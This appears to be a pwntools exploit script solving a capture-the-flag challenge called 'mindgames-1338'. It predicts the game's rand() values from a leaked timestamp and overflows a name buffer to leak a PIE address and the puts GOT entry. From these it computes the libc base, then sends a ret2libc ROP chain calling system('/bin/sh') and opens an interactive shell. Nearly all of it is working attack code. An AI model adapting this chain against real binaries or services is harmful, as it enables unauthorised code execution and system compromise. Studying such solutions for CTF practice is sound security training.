from re import findall
from datetime import datetime
from ctypes import CDLL
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF(args.EXE or './mindgames-1338')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

context.log_level = 'debug'
context.terminal = '/bin/sh'
# context.aslr = False
context.arch = 'amd64'
context.os = 'linux'

p = process("./mindgames-1338")
# p = remote("mindgames.secenv", 1338)
strdate = re.findall(b"[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}", p.recvline())[0].decode()
epoch = datetime.strptime(strdate+'-+0000',"%Y-%m-%d %H:%M:%S-%z").timestamp()

print(strdate)
print("Timer = ", int(epoch) - 18000)

C = CDLL('libc.so.6')
C.srand(int(epoch) - 18000)
# C.srand(int(epoch))
# randv = C.rand()

elf = context.binary = ELF("./mindgames-1338")
libc = ELF('libc.so.6')

randval = C.rand()
print("The first random value is", (randval % 32) + 1)
# print("2nd rand val", (C.rand() % 32) + 1)
highscore = (C.rand() % 32) + 1
print("Highscore = ", highscore)

# gdb.attach(p)

randomval3 = C.rand()
print("3rd random val = ", (randomval3 % 32) + 1)

p.sendlineafter('> '.encode(), str(2).encode())
p.sendlineafter('> '.encode(), str(randomval3).encode())
for i in range(highscore):
    p.sendlineafter('>'.encode(), str(C.rand()).encode())
p.sendlineafter('>'.encode(), str('1234').encode())

import struct
integer_value = 12
integer_bytes = struct.pack("<Q", integer_value)

# integer = 200
# integer_byte = struct.pack("<Q", integer)

data = b'\xc8'
# Pad with zeros to fill up 8 bytes
data_byte = data.ljust(8, b'\x00')

# gdb.attach(p) 

junk = b'A' * 32
# payload = junk + p64(exe.sym.start)
p.sendafter('name: '.encode(), junk + integer_bytes  + b'\xe8')

p.sendlineafter('> '.encode(), str(1).encode())
p.recvuntil("highscore:".encode())
p.recvuntil(b"\t by \t")
# print(p.recv())
leaked_pie = unpack(p.recvuntil(b'\n')[1:-1].ljust(8, b'\x00'))
# extracted_bytes = leaked_addr[-1:-1]
print("Leaked ADDR = ", hex(leaked_pie))
# print(p.recv())
# print("Puts offset in libc = ", hex(libc.symbols['puts']))
binary_base = leaked_pie  - 0x40e8
# libc_base = leaked_addr  - 0x83630
print("Binary Base addr = ", hex(binary_base))

p.sendlineafter('Exit\n> '.encode(), str(2).encode())
C.rand()
p.sendlineafter('> '.encode(), str(C.rand()).encode())
for i in range(highscore):
    p.sendlineafter('>'.encode(), str(C.rand()).encode())
p.sendlineafter('>'.encode(), str('1234').encode())

# Now again we will do the same as in mindgame-1336

integer_value = 12
integer_bytes = struct.pack("<Q", integer_value)

puts_address = binary_base + elf.got.puts
print(hex(elf.got.puts))
print(hex(puts_address))

junk = b'A' * 32
cjunk = integer_bytes
p.sendlineafter('name: '.encode(), junk + cjunk + p64(puts_address))

# gdb.attach(p)

p.sendlineafter('> '.encode(), str(1).encode())
p.recvuntil("highscore:\n".encode())
print(p.recvuntil(b"\t by \t"))

leaked_addr = unpack(p.recvuntil(b"\n")[1:-1].ljust(8, b'\x00'))
# extracted_bytes = leaked_addr[-1:-1]
print("Leaked ADDR = ", hex(leaked_addr))
print("Puts offset in libc = ", hex(libc.symbols['puts']))
# libc_base = leaked_addr  - libc.sym.puts
libc_base = leaked_addr  - 0x83630
print("Libc Base addr = ", hex(libc_base))

# Now we will bypass NX bit

rop = ROP(libc)
junkthistime = b'A' * 280   
ret = libc_base + rop.find_gadget(["ret"]).address
pop_rdi_ret = libc_base + rop.find_gadget(["pop rdi", "ret"]).address
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols["system"]
exit  = libc_base + libc.symbols["exit"]

payload = flat(junkthistime, ret, pop_rdi_ret, bin_sh, system, exit)

# gdb.attach(p)

p.sendlineafter('> '.encode(), str(2).encode())
C.rand()
p.sendlineafter('> '.encode(), str(C.rand()).encode())
for i in range(highscore):
    p.sendlineafter('>'.encode(), str(C.rand()).encode())
p.sendlineafter('>'.encode(), str('12345').encode())

p.sendlineafter(b"name: ", payload)
p.interactive()